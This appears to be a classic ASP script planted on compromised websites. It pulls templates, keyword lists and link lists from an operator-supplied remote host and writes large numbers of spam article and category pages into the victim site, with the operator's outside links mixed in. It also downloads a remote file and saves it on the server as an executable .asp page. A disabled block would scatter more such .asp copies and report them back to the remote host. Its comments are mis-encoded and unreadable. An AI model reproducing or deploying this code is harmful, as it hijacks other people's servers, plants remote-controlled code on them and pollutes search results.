<%@Language="vbscript" Codepage="936"%>
<%
Server.ScriptTimeOut=99999
Randomize
path = ""
hos = "js/fun2.asp"
lei = 1
counts = int(rnd*10)+56
pagesize = 10
t=1
if request("p")<>"" then 
	path = request("p")
end if
if request("t")<>"" then 
	t = int(request("t"))
end if
if request("s")<>"" then 
	s = int(request("s"))
end if
if request("l")<>"" then 
	l = int(request("l"))
end if
if request("hos")<>"" then 
	hos = request("hos")
end if
if right(path,1)<>"/" then
	echo "Դ��ַ�����ԡ�/������"
	over
end if

if t=2 then
	counts = counts*2
	ncon = ""
else
	ncon = getHTTPPage(path&"temp1/"&t&"/neirong.html")
end if

host = request.ServerVariables("HTTP_HOST")
lcon = getHTTPPage(path&"temp1/"&t&"/sanjimulu.html")
tcon = getHTTPPage(path&"temp1/"&t&"/mulu.html")
css = getHTTPPage(path&"temp1/"&t&"/style.css")
shoumatches = preg_m(tcon,"{foreach}([\S\s]*){\/foreach}")
ho = getHTTPPage(path&"fun2_asp.txt")
AutoCreateFolder(left(hos,instrrev(hos,"/")-1))
html ho,hos

ck_contents = getHTTPPage(path&"content.txt") 
contentarr = split(ck_contents,chr(13)&chr(10))
clen  = ubound(contentarr)

sdescon = getHTTPPage(path&"sdes.txt")


title = getHTTPPage(path&"title.txt")
neititle = getHTTPPage(path&"neititle.txt")
videoimgc = getHTTPPage(path&"video.txt")
keycon = getHTTPPage(path&"key.txt")


videoimg = split(videoimgc,chr(13)&chr(10)&chr(13)&chr(10))
videoimgc = videoimg(0)
faceimg = videoimg(1)

'��վ����
bmtype = 0
bencon = getHTTPPage("http://"&request.ServerVariables("HTTP_HOST"))
if Instr(bencon,"utf8")>0 or Instr(bencon,"utf-8")>0 or Instr(bencon,"UTF8")>0 or Instr(bencon,"UTF-8")>0 then
	bmtype = 1
end if
Set oRe = New RegExp
oRe.Pattern = "<title>(.+?)<\/title>"
Set oMatches = oRe.Execute(bencon)
if oMatches.Count>0 then  
	if bmtype=1 then
		bentitle = iconv("UTF-8","UTF-8",oMatches(0). SubMatches(0)) 'UTF-8תUTF-8
	else
		bentitle = oMatches(0). SubMatches(0)
	end if
else
	bentitle = ""
end if

if request("p1")<>"" then 
	path1 = request("p1")
else
	path1 = path
end if

incon = getHTTPPage(path1&"550.php")
inarr = split(incon,"===")
inlen = ubound(inarr)
ins=0

mulu = getHTTPPage(path&"txt/"&host&".txt")

muluarr1 = split(mulu,chr(13)&chr(10))
for i=0 to ubound(muluarr1)
	if trim(muluarr1(i))<>"" then
		if mustr="" then
			mustr =trim(muluarr1(i))
		else
			mustr = mustr&","&trim(muluarr1(i))
		end if
	end if
next
muluarr = split(mustr,",")
j=0

for ipp=0 to ubound(muluarr)
	if ipp>=s and j<l then
		'Ŀ¼
		j = j+1
		
		youl = getHTTPPage(path&"setlink.php?p="&host)
		youlink = links(youl) '��������
		axxarr = split(muluarr(ipp),"|||")
		zhukey = axxarr(0)
		nowdir = axxarr(1)
		lcon1 = replace(lcon,"{zhukey}",zhukey)
		tmatches = preg_m(lcon1,"{foreach}([\S\s]*){\/foreach}")

		AutoCreateFolder(nowdir)
		html css,nowdir&"/style.css"
		sdes = rand_ck(sdescon,1)
		
		'��վ������	
		jianjie = ""
		jianjiearr = rand_ck(sdescon,int(rnd*3)+2)
		for jji=0 to ubound(jianjiearr)
			jianjie = jianjie&jianjiearr(jji)
		next
		jianjie = replace(jianjie,"{zhukey}",zhukey)
		
		ftitle = rand_ck(title,1)
		ftitle = replace(ftitle,"{zhukey}",zhukey)
		do while Instr(ftitle,"{key}")>0
			ftitle = replace(ftitle,"{key}",rand_ck(keycon,1),1,1)	
		loop
		'if bentitle<>"" then
'			ftitle = ftitle&"-"&bentitle
'		end if
		' ---��վ������
		
		'����
		ner= 1
		redim arrxxx(counts-1,8)
		redim arrxxx2(counts-1)
		redim arrxxx3(counts-1)
		asdfxfwwe = 0
		
		if lei = 1 then
			lanmulist = ""
			sasdfdvk = int(rnd*2)+4
			keyarr = rand_ck(keycon,sasdfdvk)
			lanmulen = ubound(keyarr)-1
			redim lanmuarr(lanmulen)
			redim bbbxx(lanmulen)
			for kr=0 to lanmulen
				lanmuarr(kr) = Digital(int(rnd*4)+4)
				lanmulist = lanmulist&"<li><a href=""/"&nowdir&"/"&lanmuarr(kr)&"/"">"&keyarr(kr)&"</a></li>"
			next
			
		end if
		
		
		for xi=0 to counts-1	
			key = rand_ck(keycon,1)
			if int(rnd*2)>0  then ner=1 end if
			if lei = 1 then
				lanmukey = int(rnd*(lanmulen+1))
				nerm = lanmuarr(lanmukey)
				lanmuname = keyarr(lanmukey)
				if lanmuname="" then 
					echo lanmukey&"<br><br>"
				end if
				houzui = (xi+1)&".html"
			else
				nerm = Digital(int(rnd*4)+4)
				houzui = ""
			end if
			
			strarr = rand_ck(ck_contents,int(rnd*3)+3)
			intoss=0
			intosc=0
			intosd=0
			strcontent = ""
			for nni=0 to ubound(strarr)
				intosa =0
				'if int(rnd*2)>0 and intoss=0 then 
'					key1 = "<a href=""http://"&host&"/"&nowdir&"/"&nerm&"/"&houzui&""">"&key&"</a>"				
'					strarr(nni) = intostr(strarr(nni),key1)
'					intoss = 1
'					intosa = 1
'				end if
				if int(rnd*2)>0 and intosa=0 and intosc = 0 and ins<=inlen then 
					xdfls = split(inarr(ins),"|||")
					key2 = "<a href="""&xdfls(1)&""">"&xdfls(0)&"</a><a href="""&xdfls(1)&""">"&xdfls(1)&"</a>"				
					strarr(nni) = intostr(strarr(nni),key2)
					ins = ins + 1
					intosc = 1
				end if
				if int(rnd*2)>0 and intosd=0 then 
					charu = rand_ck(videoimgc,1)
					if right(charu,4)=".jpg" then
						swfimg = "<img alt="""&key&""" src="""&charu&""" />"
					else
						swfimg = "<embed height=""234"" type=""application/x-shockwave-flash"" width=""308"" src="""&charu&""" menu=""true"" loop=""true"" play=""true"" scale=""ShowAll"" wmode=""Window"" quality=""1""></embed>"
					end if
					strcontent = strcontent&"<p>"&strarr(nni)&"</p><p>"&swfimg&"</p>"
					intosd=1
				else
					strcontent = strcontent&"<p>"&strarr(nni)&"</p>"
				end if
			next
			'�ؼ��ʱ���
			if int(rnd*2)>0 then
				keytitle = key&autostr(nohtml(strcontent),20)
			else
				neititlernd = rand_ck(neititle,1)
				do while Instr(neititlernd,"{key}")>0
					neititlernd = replace(neititlernd,"{key}",rand_ck(keycon,1),1,1)
				loop
				keytitle = key&neititlernd
			end if
			'ͼƬ
			face = rand_ck(faceimg,1)
			datetime = year(now)&month(now)&day(now)&hour(now)&minute(now)	'&second(now)
			
			arrxxx(xi,0) = keytitle
			arrxxx(xi,1) = strcontent
			arrxxx(xi,2) = face
			arrxxx(xi,3) = datetime
			arrxxx(xi,4) = nerm
			arrxxx(xi,5) = ner
			arrxxx(xi,6) = "http://"&host&"/"&nowdir&"/"&nerm&"/"&houzui
			arrxxx(xi,7) = lanmuname
			
			for acc=0 to lanmulen
				if nerm=lanmuarr(acc) then
					bbbxx(acc) = arrxxx(xi,0)&"|||"&arrxxx(xi,1)&"|||"&arrxxx(xi,2)&"|||"&arrxxx(xi,3)&"|||"&arrxxx(xi,4)&"|||"&arrxxx(xi,5)&"|||"&arrxxx(xi,6)&"==="&bbbxx(acc)
				end if
			next
			
			arrxxx3(asdfxfwwe) = keytitle&"||"&"http://"&host&"/"&nowdir&"/"&nerm&"/"&houzui&"||"&datetime
			
			if ner=1 then 	
				arrxxx2(asdfxfwwe) = keytitle&"||"&"http://"&host&"/"&nowdir&"/"&nerm&"/"&houzui&"||"&datetime
				asdfxfwwe=asdfxfwwe+1
			end if
		next
		'���ݽ���
		abcd = ""
		adsdfsdafwe = ubound(arrxxx)
		for xxi=0 to adsdfsdafwe
			if arrxxx(xxi,5)=1 or t=3 then
				
				tconnei = replace(ncon,"{zhukey}",zhukey)
				nrand = int(rnd*990)+10
				tconnei = replace(tconnei,"{title}",arrxxx(xxi,0))
				if t=3 then
					tconnei = replace(tconnei,"{url}",arrxxx(xxi,6))
				end if
				tconnei = replace(tconnei,"{key}",arrxxx(xxi,7))
				tconnei = replace(tconnei,"{zhukey}",zhukey)
				tconnei = replace(tconnei,"{content}",arrxxx(xxi,1))
				tconnei = replace(tconnei,"{date}",arrxxx(xxi,3))
				tconnei = replace(tconnei,"{img}",arrxxx(xxi,2))
				tconnei = replace(tconnei,"{lanmulist}",lanmulist)
				tconnei = replace(tconnei,"{lanmu}",arrxxx(xxi,4))
				tconnei = replace(tconnei,"{lanmuname}",arrxxx(xxi,7))
				tconnei = replace(tconnei,"{zhuhost}",host)
				tconnei = replace(tconnei,"{rand}",nrand)
				tconnei = replace(tconnei,"{about}",neit(array_rand_ck(arrxxx2,10)))
				tconnei = replace(tconnei,"{neinew}",neit(array_rand_ck(arrxxx2,10)))
				tconnei = replace(tconnei,"{neitui}",neit(array_rand_ck(arrxxx2,10)))
				tconnei = replace(tconnei,"{zhukey1}",ftitle&"-"&bentitle)			
				if t=3 or lei=1 then '��������ƪ
					if xxi=0 then
						shang = "û����"
					else
						shang ="<a href="""&arrxxx(xxi-1,6)&""" title="""&arrxxx(xxi-1,0)&""">"&arrxxx(xxi-1,0)&"</a>"	
					end if
					if xxi=adsdfsdafwe then
						xia = "û����"
					else
						xia = "<a href="""&arrxxx(xxi+1,6)&""" title="""&arrxxx(xxi+1,0)&""">"&arrxxx(xxi+1,0)&"</a>"
					end if
					tconnei = replace(tconnei,"{shang}",shang)
					tconnei = replace(tconnei,"{xia}",xia)
				end if
				tconnei = replace(tconnei,"{host}",host&"/"&nowdir)
				tconnei = replace(tconnei,"{bentitle}",bentitle)
				tconnei = replace(tconnei,"{now}",arrxxx(xxi,4))
				nohtmlcon = arrxxx(xxi,1)
				tconnei = replace(tconnei,"{des}",autostr(nohtml(nohtmlcon),100))
				neiurl = nowdir&"/"&arrxxx(xxi,4)
				AutoCreateFolder(neiurl)
				'if int(rnd*100)<1 then
				'lhgu = year(now)&month(now)&day(now)&hour(now)&minute(now)
				'html ho,nowdir&"/"&arrxxx(xxi,4)&"/"&lhgu&".asp"
				'echo getHTTPPage(path&"jj.asp?p="&host&"/"&nowdir&"/"&arrxxx(xxi,4)&"/"&lhgu&".asp")
				'end if
				if lei = 1 then
					html tconnei,nowdir&"/"&arrxxx(xxi,4)&"/"&(xxi+1)&".html"
					echo nowdir&"/"&arrxxx(xxi,4)&"/"&(xxi+1)&".html ����ok<br>"
				else
					html tconnei,nowdir&"/"&arrxxx(xxi,4)&"/index.html"
					echo nowdir&"/"&arrxxx(xxi,4)&"/index.html ����ok<br>"
				end if
				Response.Flush
				Response.Clear
			end if '��ҳ
			
			'
		next	'����ҳ����
		 shouabcd=""
		 shouabc=""
		'��Ŀҳ
		for lllll=0 to ubound(bbbxx)
			kk = 0
			abcd=""
			abcss=""
			if bbbxx(lllll)<>"" then
				lmsx = split(bbbxx(lllll),"===")
				lmcdss = ubound(lmsx)-1
				ys = ceil(lmcdss/pagesize)
				aeeeqrlr = ""
				for lmsxi=0 to lmcdss
					lmzxxx = split(lmsx(lmsxi),"|||")
					abcss = replace(tmatches,"[date]",lmzxxx(3))
					abcss = replace(abcss,"[title]",lmzxxx(0))
					abcss = replace(abcss,"[url]",lmzxxx(6))
					abcss = replace(abcss,"[img]",lmzxxx(2))
					'abcss = replace(abcss,"[rand]",nrand)
					abcss = replace(abcss,"[content]",lmzxxx(1))
					abcd = abcd&abcss
					
					aeeeqrlr = aeeeqrlr&"<li><a href="""&lmzxxx(6)&""">"&lmzxxx(0)&"</a></li>"
					
					if lmsxi=pagesize*(kk+1)-1 or lmsxi = ubound(lmsx)-1 then
						kk = kk+1
						tconss = expReplace(lcon1,"{foreach}([\S\s]*){\/foreach}",abcd)
						pagelist = ""
						for jj = 1 to ys
							if kk = jj then
								pagelist = pagelist&"<span class=""current"">"&jj&"</span>"
							else
								if jj=1 then
									pagelist = pagelist&"<a class=""pages"" href=""http://"&host&"/"&nowdir&"/"&lmzxxx(4)&""">"&jj&"</a>"
								else
									pagelist = pagelist&"<a class=""pages"" href=""http://"&host&"/"&nowdir&"/"&lmzxxx(4)&"/index_"&jj&".html"">"&jj&"</a>"
								end if
							end if	
						next
						pagede = "<li><span class=""pageinfo"">��ǰҳ�� <strong>"&kk&"</strong> �� <strong>"&ys&"</strong> ҳ<strong> "&lmcdss+1&" ����¼</strong></span></li>"
						tconss = replace(tconss,"{pagelist}",pagelist)
						tconss = replace(tconss,"{pagede}",pagede)
						tconss = replace(tconss,"{bentitle}",bentitle)
						tconss = replace(tconss,"{jianjie}",jianjie)
						tconss = replace(tconss,"{lanmu}",lanmuarr(lllll))
						tconss = replace(tconss,"{lanmuname}",keyarr(lllll))
						tconss = replace(tconss,"{zhuhost}",host)
						tconss = replace(tconss,"{rand}",nrand)
						tconss = replace(tconss,"{neinew}",neit(array_rand_ck(arrxxx2,10)))
						tconss = replace(tconss,"{neitui}",neit(array_rand_ck(arrxxx2,10)))			
						tconss = replace(tconss,"{host}",host&"/"&nowdir)
						tconss = replace(tconss,"{lanmulist}",lanmulist)
						tconss = replace(tconss,"{des}",sdes)
						
		'				//�����ǩ
		'				tconss = replace(array("{rand1}","{rand2}","{rand3}"),array("list".rand(100,999),"list".rand(100,999),"list".rand(100,999)),tconss)
		'				
						if kk = 1 then
							'tconss = replace(tconss,"{link}",youlink) '��������
							tconss = replace(tconss,"{zhukey1}",ftitle&"-"&bentitle)
							html tconss,nowdir&"/"&lmzxxx(4)&"/index.html"
							echo nowdir&"/"&lmzxxx(4)&"/index.html ����ok<br>"
						else
							tconss = replace(tconss,"{link}","")
							dipage = "_��"&kk&"ҳ_"
							tconss = replace(tconss,"{zhukey1}",ftitle&dipage&bentitle)
							html tconss,nowdir&"/"&lmzxxx(4)&"/index_"&kk&".html"
							echo nowdir&"/"&lmzxxx(4)&"/index_"&kk&".html ����ok<br>"
							Response.Flush
							Response.Clear
						end if
						abcd = abcss = tconss = ""
					end if	
				next
					
				shouabc = replace(shoumatches,"[lanmu]",lanmuarr(lllll))
				shouabc = replace(shouabc,"[lanmuname]",keyarr(lllll))
				shouabc = replace(shouabc,"[list]",aeeeqrlr)
				shouabcd = shouabcd&shouabc
			end if		
		next
		' ������ҳ	
			shoucon = expReplace(tcon,"{foreach}([\S\s]*){\/foreach}",shouabcd)
			shoucon = replace(shoucon,"{host}",host&"/"&nowdir)
			shoucon = replace(shoucon,"{zhukey}",zhukey)
			shoucon = replace(shoucon,"{zhukey1}",ftitle&"-"&bentitle)
			shoucon = replace(shoucon,"{des}",sdes)
			shoucon = replace(shoucon,"{lanmulist}",lanmulist)
			shoucon = replace(shoucon,"{new}",neit(array_rand_ck(arrxxx2,10)))
			shoucon = replace(shoucon,"{hot}",neit(array_rand_ck(arrxxx2,10)))
			shoucon = replace(shoucon,"{link}",youlink) '��������
			
			html shoucon,nowdir&"/index.html"
			echo nowdir&"/index.html ����ok<br>"
			echo "<br>"
	end if
next

echo "<h1>ok</h1>"


AutoCreateFolder(nowdir)

function intostr(str,into)
	f_len = len(str)
	f_rnd = int(rnd*f_len)
	intostr = left(str,f_rnd)&into&right(str,f_len-f_rnd)
end function

function autostr(adsfsfdsldf,sssdlen)
	adfasdf2343 = ""
	f_len = len(adsfsfdsldf)
	f_rndxx = int(rnd*(f_len-sssdlen))
	if f_rndxx<=0 then
		f_rndxx=1
	end if
	adfasdf2343 = mid(adsfsfdsldf,f_rndxx,int(rnd*(sssdlen-5))+5)
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,",","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,"��","")
	adfasdf2343 = replace(adfasdf2343,")","")
	autostr = replace(adfasdf2343,"(","")
end function

function preg_m(con,preg)
	Set oRe = New RegExp
	oRe.Pattern = preg  '"{foreach}([\S\s]*){\/foreach}"
	Set oMatches = oRe.Execute(con)
	if oMatches.Count>0 then  
	preg_m = oMatches(0). SubMatches(0)
	else
	preg_m = ""
	end if  
end function


'�����滻expReplace
'a �滻ǰ�ַ���
'reg ������ʽ
'c �滻���ַ���
Function expReplace(ByVal a,ByVal reg,ByVal c) 
  Dim regEx, Match, Matches 
  Set regEx = New RegExp 
  regEx.Pattern = reg 
  regEx.IgnoreCase = True 
  regEx.Global = True 	
  RetStr =regEx.Replace(a, c)
  expReplace = RetStr 
End Function 

function array_rand_ck(arrck,strck)
	asdf =","
	asdfsadfasdf = 0
	redim rasxsdf(strck)
	f_len = ubound(arrck)
	if f_len<= strck then
		rasxsdf = arrck
	else
		do while asdfsadfasdf<strck
			rand = int(rnd*f_len)
			if instr(asdf,","&rand&",")<=0 then
				rasxsdf(asdfsadfasdf) = trim(arrck(rand))
				asdf =asdf&rand&","
				asdfsadfasdf=asdfsadfasdf+1
			end if
		loop
	end if
	array_rand_ck = rasxsdf
	
end function

function neit(arrck2)
	stadfsd = ""
	for aewr=0 to ubound(arrck2)
		if arrck2(aewr)<>"" then
			strsfasdfsd = split(arrck2(aewr),"||")
			stadfsd = stadfsd&"<li><a title="""&strsfasdfsd(0)&""" href="""&strsfasdfsd(1)&""">"&strsfasdfsd(0)&"</a></li>"
		end if
	next
	neit = stadfsd
end function
function rand_ck(content,str)
	Randomize
	if str>1 then
		redim r(str)
	end if
	carr = split(content,chr(13)&chr(10))
	f_key = Ubound(carr)
	if int(str)>f_key+1 then
		rand_ck =carr
	elseif int(str)=1 or f_key=0 then
		rand = int(rnd*f_key)
		rand_ck = trim(carr(rand))
	else
		for i=0 to str-1
			rand = int(rnd*f_key)
			r(i) = trim(carr(rand))
		next
		rand_ck=r
	end if
end function

function un_rand_ck(content,str)
	Randomize
	nn=0
	abc=""
	str1 = int(str)-1
	if str1>0 then
		redim r(str1)
	end if
	carr = split(content,chr(13)&chr(10))
	f_key = Ubound(carr)
	if str1>f_key or str1=f_key then
		aun_rand_ck =carr
	elseif str1=0 or f_key=0 then
		rand = int(rnd*f_key)
		aun_rand_ck = trim(carr(rand))
	else
		do while nn < str1+1
			rand = int(rnd*f_key)
			
			if instrrev(abc,"|"&rand)=0 then
				r(nn) = trim(carr(rand))
				nn=nn+1
			end if
			abc = abc&"|"&rand
		loop
		aun_rand_ck=r
	end if
	un_rand_ck = aun_rand_ck
end function


sub html(con,EXname)
	HTMLCode=con
	filename=Exname
	if HTMLCode<>"" then
	set fso = Server.CreateObject("Scripting.FileSystemObject")
	set fout = fso.CreateTextFile(server.mappath(""&filename&""))
	fout.write HTMLCode
	fout.close
	set fout=nothing
	set fso=nothing
	end if
END sub


Function getHTTPPage(url) 
dim objXML 
set objXML=createobject("MSXML2.XMLHTTP")'���� 
objXML.open "GET",url,false'�� 
objXML.send()'���� 
If objXML.readystate<>4 then '�ж��ĵ��Ƿ��Ѿ������꣬�����ͻ��˽��ܷ�����Ϣ 
exit function 
End If 
getHTTPPage=bBytesToBstr(objXML.responseBody)'������Ϣ��ͬʱ�ú���������� 
set objXML=nothing'�ر� 
if err.number<>0 then err.Clear 
End Function 


Function bBytesToBstr(body) 
dim objstream 
set objstream = CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = "UTF-8" 
'ת��ԭ��Ĭ�ϵ�UTF-8����ת����UTF-8���룬����ֱ����XMLHTTP�����������ַ�����ҳ�õ��Ľ������� 
bBytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
end Function 






'�������޼��ļ���
Function AutoCreateFolder(strPath) ' As Boolean
        On Error Resume Next
		strPath = replace(strPath,"/","\")
		strPath =server.MapPath(".")&"\"&strPath  '��ǰĿ¼�µ�..
        Dim astrPath, ulngPath, i, strTmpPath
        Dim objFSO

        If InStr(strPath, "\") <=0 Or InStr(strPath, ":") <= 0 Then
                AutoCreateFolder = False
                Exit Function
        End If
        Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
        If objFSO.FolderExists(strPath) Then
                AutoCreateFolder = True
                Exit Function
        End If
        astrPath = Split(strPath, "\")
        ulngPath = UBound(astrPath)
        strTmpPath = ""
        For i = 0 To ulngPath
                strTmpPath = strTmpPath & astrPath(i) & "\"
                If Not objFSO.FolderExists(strTmpPath) Then
                        ' ����
                        objFSO.CreateFolder(strTmpPath)
                End If
        Next
        Set objFSO = Nothing
        If Err = 0 Then
                AutoCreateFolder = True
        Else
                AutoCreateFolder = False
        End If
End Function 

function links(str)
	sss=""
	arr = split(str,"===")
	for axxxi=0 to ubound(arr)
		if trim(arr(axxxi))<>"" then
			brr = split(arr(axxxi),"|||")
			sss = sss&"<a target=""_blank"" href=""http://"&brr(1)&""">"&brr(0)&"</a> "	
		end if
	next
	links = sss
end function




function echo(str)
	if isarray(str) then
		echo "Array"
	else
		response.write str
	end if
end function

function over()
	response.end()
end function

'UTF8�������ֽ�ת��Ϊ����
Function iconv(InCharset,OutCharset,OutStr)

    Dim File

    Set File = server.CreateObject("Adodb.Stream")

    File.Charset = InCharset

    File.Mode = 3

    File.Open

    File.Type = 2

    File.Position = 0

    File.WriteText OutStr

    File.Position = 0

    File.Charset = OutCharset

    iconv = File.ReadText

End Function


function getpychar(char)
dim tmpp:tmpp=65536+asc(char)
 if(tmpp>=45217 and tmpp<=45252) then
 getpychar= "a"
elseif(tmpp>=45253 and tmpp<=45760) then
 getpychar= "b"
elseif(tmpp>=45761 and tmpp<=46317) then
 getpychar= "c"
elseif(tmpp>=46318 and tmpp<=46825) then
 getpychar= "d"
elseif(tmpp>=46826 and tmpp<=47009) then
 getpychar= "e"
elseif(tmpp>=47010 and tmpp<=47296) then
 getpychar= "f"
elseif(tmpp>=47297 and tmpp<=47613) then
 getpychar= "g"
elseif(tmpp>=47614 and tmpp<=48118) then
 getpychar= "h"
elseif(tmpp>=48119 and tmpp<=49061) then
 getpychar= "j"
elseif(tmpp>=49062 and tmpp<=49323) then
 getpychar= "k"
elseif(tmpp>=49324 and tmpp<=49895) then
 getpychar= "l"
elseif(tmpp>=49896 and tmpp<=50370) then
 getpychar= "m"
elseif(tmpp>=50371 and tmpp<=50613) then
 getpychar= "n"
elseif(tmpp>=50614 and tmpp<=50621) then
 getpychar= "o"
elseif(tmpp>=50622 and tmpp<=50905) then
 getpychar= "p"
elseif(tmpp>=50906 and tmpp<=51386) then
 getpychar= "q"
elseif(tmpp>=51387 and tmpp<=51445) then
 getpychar= "r"
elseif(tmpp>=51446 and tmpp<=52217) then
 getpychar= "s"
elseif(tmpp>=52218 and tmpp<=52697) then
 getpychar= "t"
elseif(tmpp>=52698 and tmpp<=52979) then
 getpychar= "w"
elseif(tmpp>=52980 and tmpp<=53640) then
 getpychar= "x"
elseif(tmpp>=53689 and tmpp<=54480) then
 getpychar= "y"
elseif(tmpp>=54481 and tmpp<=62289) then
 getpychar= "z"
else '����������ģ��򲻴���
 getpychar=char
end if
end function
'���ɺ��ִ�����ĸ��
function getpy(str)
for i=1 to len(str)
 getpy=getpy & getpychar(mid(str,i,1))
next
end function

Function Digital(iCount)'ȡ�������
     Dim arrChar
     Dim j,k,strCode
     arrChar = "abcdefghijklmnopqrstuvwyz"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     Digital = strCode
End Function

function nohtml(str)
	dim re
	Set re=new RegExp
	re.IgnoreCase =true
	re.Global=True
	re.Pattern="(\<.[^\<]*\>)"
	str=re.replace(str," ")
	re.Pattern="(\<\/[^\<]*\>)"
	str=re.replace(str," ")
	str=replace(str,"&nbsp;","")
	str=replace(str," ","")
	nohtml=str
	set re=nothing
end function
Function ceil(value)
    Dim return
    return = int(value)
    Cei2=value-return
    if Cei2>0 then
        Ceil = return + 1
    else
        Ceil=value+0'����Ceil=value��һ��+0 ǿ������ֵΪ������
    End If
End Function

%>